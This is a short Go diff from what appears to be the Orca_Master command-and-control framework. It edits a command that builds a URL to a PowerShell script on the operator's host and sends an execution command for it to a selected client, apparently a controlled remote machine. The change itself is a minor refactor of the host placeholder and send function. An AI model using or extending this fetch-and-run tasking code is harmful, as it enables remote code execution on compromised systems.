@@ -5,7 +5,6 @@ import (
 	"Orca_Master/cli/cmdopt/powershellopt"
 	"Orca_Master/cli/cmdopt/shellopt"
 	"Orca_Master/cli/common"
-	"Orca_Master/define/api"
 	"Orca_Master/define/colorcode"
 	"Orca_Master/define/config"
 	"Orca_Master/define/retcode"
@@ -215,9 +214,9 @@ var powershellInvokeCmd = &grumble.Command{
 		if file == "" {
 			_, file = filepath.Split(args[0])
 		}
-		url := fmt.Sprintf("http://%s/files/powershell/%s", api.HOST, file)
+		url := fmt.Sprintf("http://$host$/files/powershell/%s", file)
 		cmdStr := powershellopt.PowershellCmdParse(powershellYaml, initCmd, url)
-		retData := shellopt.SendExecShellMsg(SelectClientId, cmdStr)
+		retData := powershellopt.SendExecShellMsg(SelectClientId, cmdStr)
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "powershell request failed")
 			return nil
